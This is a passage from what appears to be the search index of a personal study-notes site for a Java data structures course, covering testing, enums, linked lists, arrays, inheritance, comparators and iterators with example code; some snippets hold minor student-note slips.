this;\n            prev = this;\n        }\n    }\n    ...\n}\n</code></pre></p>"},{"location":"cs61b%20notes/debug%20%26%20test/","title":"Debug & test","text":""},{"location":"cs61b%20notes/debug%20%26%20test/#debug","title":"Debug","text":""},{"location":"cs61b%20notes/debug%20%26%20test/#print_debugging","title":"print debugging","text":"<p>print statements</p>"},{"location":"cs61b%20notes/debug%20%26%20test/#interactive_debugging","title":"interactive debugging","text":"<ul> <li>resume</li> <li>step over</li> <li>step into</li> <li>evaluate</li> <li>conditional breakpoints (delete it after reaching it)</li> <li>exception breakpoints</li> <li>java visualizer</li> </ul>"},{"location":"cs61b%20notes/debug%20%26%20test/#test","title":"Test","text":""},{"location":"cs61b%20notes/debug%20%26%20test/#unit_tests","title":"Unit Tests","text":"<p>Write tests for every \u201cunit\u201d</p> <p><pre><code>import static com.google.common.truth.Truth.assertThat;\nimport org.junit.Test;\n\npublic class TestSort {\n   @Test\n   public void testFindSmallest() {\n       String[] input = {\"rawr\", \"a\", \"zaza\", \"newway\"};\n       int expected = 1;\n       int actual = Sort.findSmallest(input, 0);\n       assertThat(actual).isEqualTo(expected);\n   }\n}\n</code></pre> A Truth assertion takes the following format: <pre><code>assertThat(actual).isEqualTo(expected);\n\nassertThat(actual.isEmpty()).isFalse(); \nassertThat(actual.isEmpty()).isTrue();  \n// Don't forget `isTrue()` or `isFalse` when asserting boolean statements\n\nassertWithMessage(\"actual is not expected\")\n    .that(actual)\n    .isEqualTo(expected);\n\nassertThat(actualList)\n    .containsExactly(0, 1, 2, 3)\n    .inOrder();\n\nassertThat(actualList)\n    .containsExactlyElementsIn(expected)  // `expected` is a List\n    .inOrder();\n</code></pre></p>"},{"location":"cs61b%20notes/debug%20%26%20test/#test-driven_development_tdd","title":"Test-Driven Development (TDD)","text":"<p>write tests of all cases before you actually complete the code</p>"},{"location":"cs61b%20notes/debug%20%26%20test/#integration_testing","title":"Integration Testing","text":"<p>Tests cover interaction of all units at once.</p>"},{"location":"cs61b%20notes/enum/","title":"Enum","text":""},{"location":"cs61b%20notes/enum/#java_enum","title":"Java Enum  <p>An enum type is a special data type that enables for a variable to be a set of predefined constants.  The variable must be equal to one of the values that have been predefined for it.</p> <p><pre><code>public enum Planet {    // enum type (a special class)\n    MERCURY(3.303e+23, 2.4397e6),\n    EARTH(5.976e+24, 6.37814e6);    // constants (the only instances)\n\n    private final double mass;   \n    private final double radius;  \n\n    Planet(double mass, double radius) {    // invoked by the constants above\n        this.mass = mass;\n        this.radius = radius;\n    }\n\n    public double getMass() { return mass; }\n    public double getRadius() { return radius; }\n}\n</code></pre> special <code>values()</code> method  <pre><code>for (Planet p : Planet.values()) {\n    System.out.printf(\"The weight of %s is %f%n\",\n                      p, p.getMass());\n}\n</code></pre></p>  <p>proj0: 2048 <code>Side</code> <pre><code>package game2048rendering;\n\n/** Symbolic names for the four sides of a board.\n *  @author P. N. Hilfinger */\npublic enum Side {\n    /** The parameters (COL0, ROW0, DCOL, and DROW) for each of the\n     *  symbolic directions, D, below are to be interpreted as follows:\n     *     The board's standard orientation has the top of the board\n     *     as NORTH, and rows and columns (see Model) are numbered\n     *     from its lower-left corner. Consider the board oriented\n     *     so that side D of the board is farthest from you. Then\n     *        * (COL0*s, ROW0*s) are the standard coordinates of the\n     *          lower-left corner of the reoriented board (where s is the\n     *          board size), and\n     *        * If (x, y) are the standard coordinates of a certain\n     *          square on the reoriented board, then (x+DCOL, y+DROW)\n     *          are the standard coordinates of the squares immediately\n     *          above it on the reoriented board.\n     *  The idea behind going to this trouble is that by using the\n     *  x() and y() methods below to translate from reoriented to\n     *  standard coordinates, one can arrange to use exactly the same code\n     *  to compute the result of tilting the board in any particular\n     *  direction. */\n\n    NORTH(0, 0, 0, 1),\n    EAST(0, 1, 1, 0),\n    SOUTH(1, 1, 0, -1),\n    WEST(1, 0, -1, 0);\n\n    /** The side that is in the direction (DCOL, DROW) from any square\n     *  of the board.  Here, \"direction (DCOL, DROW) means that to\n     *  move one space in the direction of this Side increases the row\n     *  by DROW and the colunn by DCOL.  (COL0, ROW0) are the row and\n     *  column of the lower-left square when sitting at the board facing\n     *  towards this Side. */\n    Side(int col0, int row0, int dcol, int drow) {\n        this._row0 = row0;\n        this._col0 = col0;\n        this._drow = drow;\n        this._dcol = dcol;\n    }\n\n    /** Return the standard x-coordinate for square (x, y) on a board\n     *  of size SIZE oriented with this Side on top. */\n    int x(int x, int y, int size) {\n        return _col0 * (size - 1) + x * _drow + y * _dcol;\n    }\n\n    /** Return the standard y-coordinate for square (x, y) on a board\n     *  of size SIZE oriented with this Side on top. */\n    int y(int x, int y, int size) {\n        return _row0 * (size - 1) - x * _dcol + y * _drow;\n    }\n\n    /** Parameters describing this Side, as documented in the comment at the\n     *  start of this class. */\n    private final int _row0, _col0, _drow, _dcol;\n}\n</code></pre></p>","text":""},{"location":"cs61b%20notes/idea/","title":"Idea","text":"<p>\u4fee\u6539\u4e4b\u540e\u8981\u91cd\u65b0\u7f16\u8bd1 shift + control + f9 \u7f16\u8bd1\u7684\u662f\u4f60\u4fee\u6539\u7684\u90a3\u4e2ajava\u6587\u4ef6\uff01</p>"},{"location":"cs61b%20notes/java/","title":"Java","text":""},{"location":"cs61b%20notes/java/#java","title":"Java","text":""},{"location":"cs61b%20notes/java/#introduction","title":"Introduction","text":""},{"location":"cs61b%20notes/java/#work_flow","title":"Work Flow","text":""},{"location":"cs61b%20notes/java/#basic_java_features","title":"Basic Java Features","text":""},{"location":"cs61b%20notes/java/#basic_structure","title":"Basic Structure","text":"<pre><code>public class ClassName {      // Class name = filename (ClassName.java)\n    public static void main(String[] args) {  // Entry point\n        System.out.println(\"Hello, World!\");  \n    }\n}\n</code></pre>"},{"location":"cs61b%20notes/java/#static_typing","title":"Static Typing","text":"<p>All variables, parameters, and methods must have a declared type. Expressions also have an implicit type.</p> <p>The compiler checks that types are compatible before the program even runs. </p> <p>However, when used with mixed types (String + number), Java converts the number to a String and performs concatenation <pre><code>String h = 5 + \"horse\";     // succeed\n</code></pre></p>"},{"location":"cs61b%20notes/java/#functions","title":"Functions","text":"<p>In Java, all code is in class, so all functions are methods. <pre><code>public class Larger {\n    public static int larger(int x, int y) {\n        if (x &gt; y) {\n            return x;\n        }\n        return y;\n    }\n    public static void main(String[] args) {\n        System.out.println(larger(8, 10));\n    }\n}\n</code></pre></p>"},{"location":"cs61b%20notes/java/#code_style_comments_javadoc","title":"Code Style, Comments, Javadoc","text":""},{"location":"cs61b%20notes/java/#defining_and_using_classes","title":"Defining and Using Classes  <p>dot notation either side of a dot is not treated as expression thus it is not evaluated.   \u2192 use hard-coded dot notation.</p>","text":""},{"location":"cs61b%20notes/java/#constructors","title":"Constructors","text":"<p><pre><code>public class Dog {\n    public int weightInPounds;  \n    public Dog(int w) {     // constructor\n        weightInPounds = w;\n    }\n}\n\nd = new Dog(20);    // initialize\n</code></pre> <code>this</code> keyword can be used to access the current object's instance variables or methods, which is not mandatory (as long as variable names are unique) however, <pre><code>public Dog(int size){\n    this.size = size;   // `this` here is mandatory\n}\n</code></pre></p>"},{"location":"cs61b%20notes/java/#variables","title":"Variables","text":"<pre><code>public class Dog {\n    public int weightInPounds;  // instance variable / non-static variable\n    public static String binomen = \"Canis familiaris\";  // class variable / static variable\n    ...\n}\n\nd = new Dog(20)\nw = d.weightInPouns //invoked by instance \n\nb = Dog.binomen //invoked by class\n</code></pre>"},{"location":"cs61b%20notes/java/#methods","title":"Methods","text":"<p>Class methods / static methods taken by the class itself <pre><code>x = Math.sqrt(100);\n</code></pre> Instance methods / non-static methods taken only by a specific instance of a class <pre><code>public class Dog {\n    public int weightInPounds;\n    public void makeNoise() {\n        if (weightInPounds &lt; 10) {  // take instance variable\n            System.out.println(\"yipyipyip!\");\n        } else if (weightInPounds &lt; 30) {\n            System.out.println(\"bark. bark.\");\n        } else {\n            System.out.println(\"woof!\");\n        }\n    }    \n}\n</code></pre></p>"},{"location":"cs61b%20notes/java/#references","title":"References","text":""},{"location":"cs61b%20notes/java/#declaring_a_variable","title":"Declaring a Variable","text":"<ul> <li>When you declare a variable of a certain type, Java finds a contiguous block with exactly enough bits to hold a thing of that type</li> <li>Java provides no way for you to know the location of the box</li> <li>There are no default values.</li> </ul>"},{"location":"cs61b%20notes/java/#the_golden_rule_of_equals_groe","title":"The Golden Rule of Equals (GRoE)","text":"<p><code>y = x</code> : copy the bits from x into y</p>"},{"location":"cs61b%20notes/java/#primitive_types","title":"Primitive Types","text":"<ul> <li>numeric: </li> <li>short (1B), byte (2B), int (4B), long (8B)</li> <li>float (4B), double (8B)</li> <li>char (2B) -- can express Chinese charactors</li> <li>boolean (1B): <code>true</code> &amp; <code>false</code></li> </ul>"},{"location":"cs61b%20notes/java/#reference_types","title":"Reference Types","text":""},{"location":"cs61b%20notes/java/#reference_variable_declaration","title":"Reference Variable Declaration","text":"<p><pre><code>Walrus someWalrus;\n</code></pre> When we declare a variable of any reference type, Java allocates a box of 64 bits, no matter what type of object.</p>"},{"location":"cs61b%20notes/java/#object_instantiation_assignment","title":"Object Instantiation &amp; Assignment","text":"<p><pre><code>someWalrus = new Walrus(1000, 8.3);\n</code></pre> Initialization instantiate with <code>new</code>: allocates a box for each instance variable of the class, and fills them with a default value. | object type  |  default value | |---|---| | numeric  |  0 / 0.0 | |  char | null char  | |boolean|false| |  reference type | null  | <pre><code>public class Person {\n    int age;          // default: 0\n    String name;      // default: null\n    boolean isStudent; // default: false\n}\n</code></pre></p> <p>Assignment assign with <code>=</code>: store the address of the instance</p> <p>assign <code>null</code> to a reference variable: all zeros</p> <p>About <code>null</code>: If we try to access an instance member or call an instance method from a value of null, we will see an error called a <code>NullPointerException</code>.</p>"},{"location":"cs61b%20notes/java/#parameter_passing","title":"Parameter Passing","text":"<p>Copying the bits is usually called \"pass by value\".  In Java, we always pass by value.</p>"},{"location":"cs61b%20notes/java/#lists","title":"Lists","text":""},{"location":"cs61b%20notes/java/#intlist","title":"IntList","text":"<p>constructor: <code>first</code> &amp; <code>rest</code> <pre><code>IntList l = new IntList(5, null);\n</code></pre> naked recursive data structure: In order to use an <code>IntList</code> correctly, the programmer must understand and utilize recursion even for simple list related tasks.</p>"},{"location":"cs61b%20notes/java/#sllist_single_linked_list","title":"SLList (single linked list)","text":"<p>Invariants (a fact about a data structure that is guaranteed to be true): - The sentinel reference always points to a sentinel node. - The front item (if it exists), is always at sentinel.next.item. - The size variable is always the total number of items that have been added. <pre><code>public class SLList {\n\n        // nested classes definition \n        public static class IntNode {   // rename\n                public int item;    \n                public IntNode next;\n                public IntNode(int i, IntNode n) {\n                    item = i;\n                    next = n;\n                }\n        }\n\n        private IntNode sentinel;  // private\n        private int size;    // caching: saving important data to speed up retrieval\n\n        public SLList(int x){\n            sentinel = new IntList(0, null);\n            sentinel.next = new IntList(x, null);\n            size = 1;\n        }\n\n        public SLList(){    \n            // overload: the same method name, different argument signature\n            sentinel = new IntList(0, null);\n            size = 0;\n        }\n\n        public int size(){\n            return size;\n        }\n\n        public void addFirst(int x){\n            size += 1;  // keep current track\n            sentinel.next = new IntList(x, first);\n        }\n\n        public int getFirst(){\n            return sentinel.next.item;\n        }\n\n        public void addLast(int x){\n            size += 1;\n\n            /* implement without sentinel:\n            if (first == null){     // cope with special cases -- not pretty\n                first = new IntList(x);\n                return;\n            }\n            */\n\n            IntNode p = sentinel;   // sentinel: to avoid special cases \n            while (p.next != null){     \n                p = p.next;\n            }\n            p.next = new IntNode(x, null);\n\n            /* wrong: \n            while (p != null){\n                p = p.next;\n            }\n            p = new... \n            */\n\n        }\n</code></pre></p>"},{"location":"cs61b%20notes/java/#nested_class","title":"Nested Class","text":"<p>Having a nested class has no meaningful effect on code performance, and is simply a tool for keeping code organized. <pre><code>public class SLList {\n    public static class IntNode {\n        public int item;\n        public IntNode next;\n        public IntNode(int i, IntNode n) {\n            item = i;\n            next = n;\n        }\n    }\n\n    private IntNode sentinel;\n    ...\n</code></pre> static nested class Methods inside the static class can not access any of the members (instance variables &amp; methods) of the enclosing class. - Adventage: The nested class doesn't get a reference to its boss, saving us a small amount of memory.</p> <p>reference to static nested classes - in the closing class:  <pre><code>new IntNode()\n</code></pre> - out of the closing class:  <pre><code>new SLList.IntNode()\n</code></pre></p>"},{"location":"cs61b%20notes/java/#dllist_double_linked_list","title":"DLList (double linked list)","text":"solutions addLast removeLast cases of last SLList: first sentinel slow + last pointer quick slow DLList: first sentinel + last node quick quick special (first sentinel or real node) first sentinel + last sentinel quick quick generel circular quick quick general <ul> <li>sentBack: </li> <li>circular: </li> </ul> <pre><code>public class DLList{\n    public static class IntNode{\n        int item;\n        IntNode prev;\n        IntNode next;\n        ...\n    }\n    ...\n}\n</code></pre>"},{"location":"cs61b%20notes/java/#generic_lists","title":"Generic Lists","text":"<p><pre><code>public class DLList&lt;BleepBlorp&gt; {\n    private IntNode sentinel;\n    private int size;\n\n    public class Node {\n        public Node prev;\n        public BleepBlorp item;\n        public Node next;\n        ...\n    }\n    ...\n}\n</code></pre> Since generics only work with reference types, we cannot put primitives like <code>int</code> or <code>double</code> inside of angle brackets.  Instead, we use the reference version of the primitive type <pre><code>DLList&lt;Integer&gt; d1 = new DLList&lt;&gt;(5);\nDLList&lt;Integer&gt; d1 = new DLList&lt;Integer&gt;(5); // redundant\n</code></pre></p>"},{"location":"cs61b%20notes/java/#arrays","title":"Arrays","text":""},{"location":"cs61b%20notes/java/#array_creation","title":"Array Creation","text":"<pre><code>int[] x;\nx = new int[]{1, 2, 3, 4, 5};   \n\nx = new int[5];     // get default value\nx[0] = 1;\nx[1] = 2;   \n\nint[] x = {1, 2, 3, 4, 5}\n\nx = null;   // null\nx = int[0];     // empty\n\nint n = 5;\nx = new int[x];     // can be evaluated\n</code></pre>"},{"location":"cs61b%20notes/java/#vs_arraysequals","title":"== vs. Arrays.equals","text":"<ul> <li><code>==</code> compare the literal bits in memory boxes  x and y</li> <li><code>Array.equals</code> compare the two content of the two arrays <pre><code>int[] x = new int[]{0, 1, 2, 95, 4};\nint[] y = new int[]{0, 1, 2, 95, 4};\nSystem.out.println(x == y);     // false\nSystem.out.println(Arrays.equals(x, y));    // true\n</code></pre></li> </ul>"},{"location":"cs61b%20notes/java/#array_access_and_modification","title":"Array Access and Modification","text":"<p>Array Copy - <code>System.arraycopy()</code> <pre><code>System.arraycopy(arr1, start1, arr2, start2, length);\n</code></pre> - loop <pre><code>while (i = 0; i &lt; x.length; i ++) {\n    y[i] = x[i];\n}\n</code></pre></p>"},{"location":"cs61b%20notes/java/#2d_arrays","title":"2D Arrays","text":"<p><pre><code>int[][] mat;\nmat = new int[4][4];   \n</code></pre> </p> <pre><code>int[][] pascalsTriangle;\npascalsTriangle = new int[4][];\nint[] rowZero = pascalsTriangle[0];     // default value: null\n\npascalsTriangle[0] = new int[]{1};\npascalsTriangle[1] = new int[]{1, 1};\npascalsTriangle[2] = new int[]{1, 2, 1};\npascalsTriangle[3] = new int[]{1, 3, 3, 1};\nint[] rowTwo = pascalsTriangle[2];\nrowTwo[1] = -5;\n\nint[][] pascalAgain = new int[][]{{1}, {1, 1},{1, 2, 1}, {1, 3, 3, 1}};\n</code></pre>"},{"location":"cs61b%20notes/java/#arrays_vs_classes","title":"Arrays vs. Classes","text":"<p>Both arrays and classes can be used to organize a bunch of memory boxes. In both cases, the number of memory boxes is fixed,  - the length of an array cannot be changed - class fields cannot be added or removed.</p> <p>differences  - Array boxes are numbered and accessed using [] notation, and class boxes are named and accessed using dot notation. - Array boxes must all be the same type. Class boxes can be different types.</p>"},{"location":"cs61b%20notes/java/#arraylist","title":"ArrayList","text":""},{"location":"cs61b%20notes/java/#invarianats","title":"Invarianats","text":"<ul> <li> <p>The position of the next item to be inserted (using addLast) is always size.</p> </li> <li> <p>The number of items in the AList is always size.</p> </li> <li> <p>The position of the last item in the list is always size - 1. <pre><code>public class AList{\n    private int[] item;\n    private int size;\n\n    public AList(){\n        item = int[100];\n        size = 0;\n    }\n}\n</code></pre> The list is an abstract idea, and the <code>size</code>, <code>items</code>, and <code>items[i]</code> memory boxes are the concrete representation of that idea.  Any change to our list must be reflected in a change in one or more memory boxes in our implementation. Our invariants provide us with a guide for what those changes should look like.</p> </li> </ul>"},{"location":"cs61b%20notes/java/#removelast","title":"removeLast","text":"<p>no need to actually zero the element  <pre><code>public int removeLast(){\n    int x = getLast();\n    size -= 1\n    return x\n}\n</code></pre></p>"},{"location":"cs61b%20notes/java/#resizing","title":"Resizing","text":""},{"location":"cs61b%20notes/java/#naive_resizing_arrays","title":"Naive Resizing Arrays","text":"<pre><code>resize(size + RFACTOR);\n</code></pre>"},{"location":"cs61b%20notes/java/#geometric_resizing","title":"Geometric Resizing","text":"<pre><code>resize(size * RFACTOR);\n</code></pre>"},{"location":"cs61b%20notes/java/#memory_performance","title":"Memory Performance","text":"<p>\"usage ratio\" R In a typical implementation, we halve the size of the array when R falls to less than 0.25.</p>"},{"location":"cs61b%20notes/java/#generic_alists","title":"Generic ALists","text":"<p>Java does not allow us to create an array of generic objects due to an obscure issue with the way generics are implemented. <pre><code>Glorp[] items = (Glorp []) new Object[8];\n</code></pre></p>"},{"location":"cs61b%20notes/java/#changes_of_remove","title":"changes of remove","text":"<p>Whereas before, we had no reason to zero out elements that were deleted, with generic objects, we do want to null out references to the objects.  This is to avoid \"loitering\". If we fail to null out the reference, then Java will not garbage collect the objects that have been added to the list.</p>"},{"location":"cs61b%20notes/java/#inheritance","title":"Inheritance","text":""},{"location":"cs61b%20notes/java/#hierarchy","title":"Hierarchy","text":"<ul> <li>Superclass: Hypernyms </li> <li>Subclass: Hyponyms</li> </ul>"},{"location":"cs61b%20notes/java/#static_dynamic_type","title":"Static &amp; Dynamic Type","text":"<pre><code>List61B&lt;String&gt; lst = new SLList&lt;String&gt;();\n</code></pre> Static Type Dynamic Type specified in declaration initialization checked at compilie time runtime <p>dynamic method selection:  When Java runs a method that is overriden, it searches for the appropriate method signature in it's dynamic type and runs it.</p>"},{"location":"cs61b%20notes/java/#compile-time_type_checking","title":"Compile-Time Type Checking","text":"<p>Compiler allows method calls &amp; assignment based on compile-time type of variable &amp; expressions. </p> <p>An expression using the <code>new</code> keyword has the specified compile-time type. <pre><code>SLList&lt;Integer&gt; sl = new VengefulSLList&lt;Integer&gt;();\n</code></pre></p> <ul> <li>RHS expression: <code>VengefulSLList</code></li> <li>LHS variable: <code>SLList</code></li> <li>A VengefulSLList is-an SLList, so assignment is allowed.</li> </ul> <p><pre><code>VengefulSLList&lt;Integer&gt; vsl = new SLList&lt;Integer&gt;();\n</code></pre> * An SLList is not necessarily a VengefulSLList, so compilation error results.</p> <p>Method calls have compile-time type equal to their declared type.</p> <p><pre><code>public static Dog maxDog(Dog d1, Dog d2) { \u2026 }\n</code></pre> <pre><code>Poodle frank  = new Poodle(\"Frank\", 5);\nPoodle frankJr = new Poodle(\"Frank Jr.\", 15);\n\nDog largerDog = maxDog(frank, frankJr);     // succeed\nPoodle largerPoodle = maxDog(frank, frankJr);   // error\n</code></pre></p>"},{"location":"cs61b%20notes/java/#casting","title":"Casting","text":"<p>specify the compile-time type of any expression.</p> <p>powerful but dangerous:</p>"},{"location":"cs61b%20notes/java/#poodle_frank_new_poodlefrank_5_malamute_franksr_new_malamutefrank_sr_100_poodle_largerpoodle_poodle_maxdogfrank_franksr_can_compile_but_crash_at_runtime","title":"<pre><code>Poodle frank  = new Poodle(\"Frank\", 5);\nMalamute frankSr = new Malamute(\"Frank Sr.\", 100);\n\nPoodle largerPoodle = (Poodle) maxDog(frank, frankSr);  // can compile, but crash at runtime\n</code></pre>","text":""},{"location":"cs61b%20notes/java/#interface_inheritance","title":"Interface Inheritance","text":"<p>Interface It is essentially a contract that specifies what a subclass must be able to do, but it doesn't provide any implementation for those behaviors. - what \u221a - how \u00d7 <pre><code>public interface List61B&lt;Item&gt; {\n    void addFirst(Item x);\n    void add Last(Item y);\n    Item getFirst();\n    Item getLast();\n    Item removeLast();\n    Item get(int i);\n    void insert(Item x, int position);\n    int size();\n}\n</code></pre> default access modifier: <code>public</code></p> <p>Class If a \u201csubclass\u201d has a method with the exact same signature as in the \u201csuperclass\u201d, we say the subclass overrides the method. - should assign the same or stronger access privileges <pre><code>public class AList&lt;Item&gt; implements List61B&lt;Item&gt;{\n    ...\n    @Override\n    public void addFirst(Item x) {\n        insert(x, 0);\n    }\n    ...\n\n    // must override all the method (wihtout implementation) in the interface\n}\n</code></pre></p>"},{"location":"cs61b%20notes/java/#implementation_inheritance","title":"Implementation Inheritance","text":"<p>superclass: - interface \u2192 default method - class \u2192 extend</p>"},{"location":"cs61b%20notes/java/#default_methods","title":"Default Methods","text":"<p><pre><code>public interface List61B&lt;Item&gt; {\n    ...\n    default public void print() {   // must include the `default` keyword\n        for (int i = 0; i &lt; size(); i += 1) {\n            System.out.print(get(i) + \" \");\n        }\n        System.out.println();\n    }\n}\n</code></pre> We want <code>SLList</code> to print a different way than the way specified in its interface. To do this, override. <pre><code>@Override\npublic void print() {\n    for (Node p = sentinel.next; p != null; p = p.next) {\n        System.out.print(p.item + \" \");\n    }\n}\n</code></pre></p>"},{"location":"cs61b%20notes/java/#extend","title":"Extend","text":"<p>RotatingSLList <pre><code>public class RotatingSLList&lt;Blorp&gt; extends SLList&lt;Blorp&gt;{\n       public void rotateRight() {\n              Blorp oldBack = removeLast();\n              addFirst(oldBack);\n    }\n}\n</code></pre> Because of extends, <code>RotatingSLList</code> inherits all members of <code>SLList</code>: - All instance and static variables. - All methods. - All nested classes.</p> <p>imexplixit contructor: <pre><code>public RotatignSLList(){\n    super();    // call the zero-parameter contructor\n}\n</code></pre></p> <p>VengefulSllist <pre><code>public class VengefulSLList&lt;Item&gt; extends SLList&lt;Item&gt; {\n/* Remembers all Items that have been destroyed by removeLast. */\n    private SLList&lt;Item&gt; deletedItems;\n    public VengefulSLList() {\n            deletedItems = new SLList&lt;Item&gt;();\n        }\n\n    @Override\n    public Item removeLast() {\n            Item oldBack = super.removeLast(); // calls Superclass\u2019s version of removeLast() \n            deletedItems.addLast(oldBack);\n            return oldBack;\n    }\n\n    public void printLostItems() {\n            deletedItems.print();\n    }\n}\n</code></pre> the constructor behavior: rule: All constructors must start with a call to one of the super class\u2019s constructors <pre><code>public VengefulSLList() {\n   deletedItems = new SLList&lt;Item&gt;();   // imexplicitly call the zero-parameter constructor\n}\n\npublic VengefulSLList() {   \n   super();\n   deletedItems = new SLList&lt;Item&gt;();   \n}\n\npublic VengefulSLList(Item x) {     \n   super(x);\n   deletedItems = new SLList&lt;Item&gt;();   \n}\n</code></pre></p>"},{"location":"cs61b%20notes/java/#the_object_class","title":"The Object Class","text":"<p>Every type in Java is a descendant of the <code>Object</code> class</p>"},{"location":"cs61b%20notes/java/#encapsulation","title":"Encapsulation","text":"<p>Some tools for managing complexity:</p> <ul> <li> <p>Hierarchical abstraction.</p> <ul> <li>Create layers of abstraction, with clear abstraction barriers!</li> </ul> </li> <li> <p>\u201cDesign for change\u201d </p> <ul> <li>Organize program around objects.</li> <li>Let objects decide how things are done.</li> <li>Hide information others don\u2019t need.</li> </ul> </li> </ul> <p>Module: A set of methods that work together as a whole to perform some task or set of related tasks.  A module is said to be encapsulated if its implementation is completely hidden, and it can be accessed only through a documented interface.</p>"},{"location":"cs61b%20notes/java/#implementation_inheritance_breaks_encapsulation","title":"Implementation Inheritance Breaks Encapsulation","text":"<p><pre><code>public class Dog{\n    ...\n    public void bark() {\n    System.out.println(\"bark\");\n    }\n    public void barkMany(int N) {\n    for (int i = 0; i &lt; N; i += 1) {\n        bark();\n    }\n    }\n}\n</code></pre> <pre><code>public class VerboseDog extends Dog{\n    ...\n    @Override\n    public void barkMany(int N) {\n        System.out.println(\"As a dog, I say: \");\n        for (int i = 0; i &lt; N; i += 1) {\n            bark();\n        }\n    }\n}\n</code></pre> vd.barkMany(3): infinite loop!</p>"},{"location":"cs61b%20notes/java/#higher_order_functions","title":"Higher Order Functions","text":"<p>Higher Order Function: A function that treats another function as data.</p> <p>Fundamental issue: Memory boxes (variables) cannot contain pointers to functions. use an interface (to realize generalization) instead: <pre><code>public interface IntUnaryFunction {\n    int apply(int x);\n}\n\npublic class TenX implements IntUnaryFunction {\n    public int apply(int x) {\n        return 10 * x;\n    }\n}\n\npublic class HoFDemo {\n    public static int do_twice(IntUnaryFunction f, int x) {\n        return f.apply(f.apply(x));\n    }\n\n    public static void main(String[] args) {\n        System.out.println(do_twice(new TenX(), 2));\n        // wrong: do_twice(TenX, 2)  -- pass an instance!\n    }\n}\n</code></pre></p>"},{"location":"cs61b%20notes/java/#subtype_polymorphism","title":"Subtype Polymorphism","text":"<p>Polymorphism, at its core, means 'many forms'. In Java, polymorphism refers to how objects can have many forms or types -- an instance of its own class, its superclass, its superclass's superclass... </p> <p>larger</p> <p>Explicit HoF Approach: <pre><code>def print_larger(x, y, compare, stringify):\n    if compare(x, y):\n        return stringify(x)\n    return stringify(y)\n</code></pre> Subtype Polymorphism Approach: </p> <p><pre><code>def print_larger(x, y):\n    if x.largerThan(y):\n        return x.str()\n    return y.str()\n</code></pre> The object itself makes the choices.  The behavior of the function is dependent on what the parameters actually are.</p>"},{"location":"cs61b%20notes/java/#comparable_comparator","title":"Comparable &amp; Comparator","text":""},{"location":"cs61b%20notes/java/#comparable","title":"Comparable","text":"<p>OurComparable <pre><code>public interface OurComparable{\n    public int compareTo(Object o);\n}\n</code></pre> <pre><code>public class Dog implements OurComparable{\n    ...\n    @Override\n    public int compareTo(Object o){    // the same signature! \n        Dog otherDog = (Dog) o; // casting, or cannot compile\n        return this.size - otherDog.size;\n    }\n}\n</code></pre> <pre><code>public class Maximizer {\n   public static OurComparable max(OurComparable[] items) {\n      int maxDex = 0;\n      for (int i = 0; i &lt; items.length; i += 1) {\n         int cmp = items[i].compareTo(items[maxDex]);\n         if (cmp &gt; 0) {\n            maxDex = i;\n         }\n      }\n      return items[maxDex];\n   }\n}\n</code></pre> - Setbacks:   - casting (verbose and dangerous)   - not concludes other types (Integers, Strings...)</p> <p>Comparable</p> <p><code>Comparable</code> is already defined by Java and is used by countless libraries. <pre><code>public interface Comparable&lt;T&gt;{     // `&lt;&gt;` --&gt; casting not required\n    public int compareTo(T obj);\n}\n</code></pre> <pre><code>public class Dog implements Comparable&lt;Dog&gt; {\n    ...\n    @Override\n    public int compareTo(Dog uddaDog) {\n        return this.size - uddaDog.size;\n    }\n}\n</code></pre> <pre><code>public class Maximizer {\n   public static Comparable max(Comparable[] items) {\n      int maxDex = 0;\n      for (int i = 0; i &lt; items.length; i += 1) {\n         int cmp = items[i].compareTo(items[maxDex]);\n         if (cmp &gt; 0) {\n            maxDex = i;\n         }\n      }\n      return items[maxDex];\n   }\n}\n</code></pre></p>"},{"location":"cs61b%20notes/java/#comparator","title":"Comparator","text":"<p>Natural order: the ordering implied in the <code>compareTo</code> method of a particular class.</p> <p>What if we'd like to sort in a different way? -- using <code>Comparator</code>'s <pre><code>public interface Comparator&lt;T&gt; {\n    int compare(T o1, T o2);\n}\n</code></pre> <pre><code>import java.util.Comparator;\n\npublic class Dog implements Comparable&lt;Dog&gt; {\n    ...\n    public int compareTo(Dog uddaDog) {\n        return this.size - uddaDog.size;\n    }\n\n    private static class NameComparator implements Comparator&lt;Dog&gt; {   // nested static class\n        @Override\n        public int compare(Dog a, Dog b) {\n            return a.name.compareTo(b.name);    // String is comparable\n        }\n    }\n\n    public static Comparator&lt;Dog&gt; getNameComparator() {\n        return new NameComparator();\n    }\n}\n</code></pre> <pre><code>public static void main(String[] args){\n    Dog d1 = new Dog(\"Cheems\", 100);\n    Dog d2 = new Dog(\"Lucy\", 99);\n\n    Comparator&lt;Dog&gt; nc = Dog.getNameComparator();\n    /* Dog.NameComparator nc = new Dog.NameComparator() */\n    int cmp = nc.compare(d1, d2);\n    if (cmp &gt; 0){\n        d1.bark();\n    } else {\n        d2.bark();\n    }\n}\n</code></pre></p>"},{"location":"cs61b%20notes/java/#iterable_iterator","title":"Iterable &amp; Iterator","text":""},{"location":"cs61b%20notes/java/#enhenced_for_loop","title":"Enhenced For Loop","text":"<p><pre><code>Set&lt;String&gt; s = new HashSet&lt;&gt;();\n</code></pre> <pre><code>for (String city : s) {\n    ...\n}\n</code></pre> equivalent to  <pre><code>Iterator&lt;String&gt; seer = s.iterator();\nwhile (seer.hasNext()) {\n    String city = seer.next();\n    ...\n}\n</code></pre></p>"},{"location":"cs61b%20notes/java/#iterator","title":"Iterator","text":"<p>interface <pre><code>public interface Iterator&lt;T&gt; {\n    boolean hasNext();\n    T next();\n}\n</code></pre> implement</p> <p>ArraySetIterator <pre><code>private class ArraySetIterator implements Iterator&lt;T&gt; {\n    private int wizPos;\n\n    public ArraySetIterator() {\n        wizPos = 0;\n    }\n\n    @Override\n    public boolean hasNext() {\n        return wizPos &lt; size;\n    }\n\n    @Override\n    public T next() {\n        T returnItem = items[wizPos];\n        wizPos += 1;\n        return returnItem;\n    }\n}\n</code></pre> A common convention is to throw a <code>NoSuchElementException</code> if someone calls <code>next</code> when <code>hasNext</code> returns false</p>"},{"location":"cs61b%20notes/java/#iterable","title":"Iterable","text":"<p>interface <pre><code>public interface Iterable&lt;T&gt; {\n    Iterator&lt;T&gt; iterator();\n}\n</code></pre> implement</p> <p>ArraySet <pre><code>import java.util.Iterator;\n\npublic class ArraySet&lt;T&gt; implements Iterable&lt;T&gt; {\n    private T[] items;\n    private int size; \n\n    public ArraySet() {\n        items = (T[]) new Object[100];\n        size = 0;\n    }\n\n    public boolean contains(T x) {...}\n\n    public void add(T x) {\n        if (x == null) {\n            throw new IllegalArgumentException(\"can't add null\");\n        }\n        ...\n    }\n\n    public int size() {...}\n\n    @Override \n    public 